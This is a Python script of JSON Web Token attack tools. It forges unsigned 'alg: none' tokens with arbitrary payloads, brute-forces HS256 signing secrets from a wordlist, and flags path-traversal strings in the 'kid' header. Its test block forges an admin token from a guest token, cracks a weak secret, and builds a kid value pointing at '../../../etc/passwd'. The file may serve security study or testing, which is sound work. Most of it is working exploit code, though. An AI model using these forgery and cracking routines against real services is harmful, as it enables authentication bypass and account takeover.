import hmac
import hashlib
from utils import encode_jwt_part, decode_jwt_part, split_jwt, b64url_decode

def forge_none_token(original_token, new_payload_dict):
    """Create an alg:none token with any payload you want"""
    # Get original header
    header_b64, _, _ = split_jwt(original_token)
    original_header = decode_jwt_part(header_b64)
    
    # Modify header to use 'none' algorithm
    evil_header = original_header.copy()
    evil_header["alg"] = "none"
    
    # Encode new header and payload
    new_header_b64 = encode_jwt_part(evil_header)
    new_payload_b64 = encode_jwt_part(new_payload_dict)
    
    # No signature for alg:none (empty string)
    return f"{new_header_b64}.{new_payload_b64}."

def crack_hs256_secret(token, wordlist_path):
    """Brute force HMAC secret using a wordlist file"""
    # Extract parts once
    header_b64, payload_b64, sig_b64 = split_jwt(token)
    message = f"{header_b64}.{payload_b64}".encode('utf-8')
    provided_sig = b64url_decode(sig_b64)
    
    # Read wordlist line by line
    with open(wordlist_path, 'r') as file:
        for line in file:
            word = line.strip()  # Remove newline
            if not word:
                continue
            
            # Try this word as secret
            secret_bytes = word.encode('utf-8')
            computed_sig = hmac.new(secret_bytes, message, hashlib.sha256).digest()
            
            if hmac.compare_digest(computed_sig, provided_sig):
                return word  # Found it!
    
    return None  # Not found

def check_suspicious_kid(token):
    """Check if token has path traversal in kid header"""
    try:
        header_b64, _, _ = split_jwt(token)
        header = decode_jwt_part(header_b64)
        kid = header.get("kid", "")
        
        suspicious = ["../", "..\\", "/etc/", "\\windows\\", "%2e"]
        for pattern in suspicious:
            if pattern in kid.lower():
                return True, f"Suspicious pattern '{pattern}' found in kid: {kid}"
        
        return False, "No suspicious patterns found"
    except:
        return False, "Could not parse token"

# Test the attacks
if __name__ == "__main__":
    import jwt
    
    # Create a weak token for testing
    weak_token = jwt.encode({"user": "admin"}, "password123", algorithm="HS256")
    print(f"Weak token: {weak_token}")
    
    # Test cracker (create wordlist file first)
    with open("test_wordlist.txt", "w") as f:
        f.write("abc\nsecret\npassword123\nxyz")
    
    found = crack_hs256_secret(weak_token, "test_wordlist.txt")
    print(f"Crack result: {found}")
    
    # Test alg:none attack
    original = jwt.encode({"user": "guest"}, "secret", algorithm="HS256")
    forged = forge_none_token(original, {"user": "admin"})
    print(f"\nOriginal: {original}")
    print(f"Forged: {forged}")
    
    # Test kid detection
    evil_header = {"alg": "HS256", "kid": "../../../etc/passwd"}
    evil_b64 = encode_jwt_part(evil_header)
    evil_token = f"{evil_b64}.eyJ1c2VyIjoiYWxpY2UifQ.signature"
    
    suspicious, msg = check_suspicious_kid(evil_token)
    print(f"\nKid check: {msg}")